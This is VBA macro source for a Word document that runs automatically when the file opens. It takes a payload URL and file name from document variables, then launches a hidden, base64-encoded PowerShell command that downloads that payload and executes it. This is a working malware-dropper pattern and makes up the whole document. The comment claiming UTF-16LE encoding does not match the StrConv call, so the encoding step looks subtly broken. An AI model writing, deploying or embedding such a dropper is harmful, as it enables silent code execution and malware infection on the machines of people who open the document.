Sub Document_Open()
    AutoOpen
End Sub

Sub AutoOpen()
    Dim url As String
    Dim filename As String
    
    ' Example: read from document variables or custom document properties
    url = ThisDocument.Variables("payload_url").Value
    filename = ThisDocument.Variables("payload_name").Value
    
    If url = "" Or filename = "" Then
        MsgBox "Payload URL or filename not set."
        Exit Sub
    End If
    
    Call DownloadAndExecute(url, filename)
End Sub

Sub DownloadAndExecute(ByVal url As String, ByVal filename As String)
    Dim psCommand As String
    Dim psScript As String
    Dim encodedCommand As String
    
    ' PowerShell script to download and execute the payload
    psScript = "$u='" & url & "'; wget $u -OutFile " & filename & "; Start-Process " & filename
    
    ' Encode the PowerShell script in base64 (UTF-16LE)
    encodedCommand = Base64Encode(psScript)
    
    psCommand = "powershell -NoProfile -WindowStyle Hidden -EncodedCommand " & encodedCommand
    Shell psCommand, vbHide
End Sub

Function Base64Encode(text As String) As String
    Dim arrData() As Byte
    Dim objXML As Object
    Dim objNode As Object
    
    ' Convert string to UTF-16LE byte array
    arrData = StrConv(text, vbFromUnicode)
    
    ' Create XML DOM document
    Set objXML = CreateObject("MSXML2.DOMDocument.6.0")
    Set objNode = objXML.createElement("b64")
    
    ' Encode byte array to base64
    objNode.DataType = "bin.base64"
    objNode.nodeTypedValue = arrData
    Base64Encode = objNode.text
    
    ' Clean up
    Set objNode = Nothing
    Set objXML = Nothing
End Function
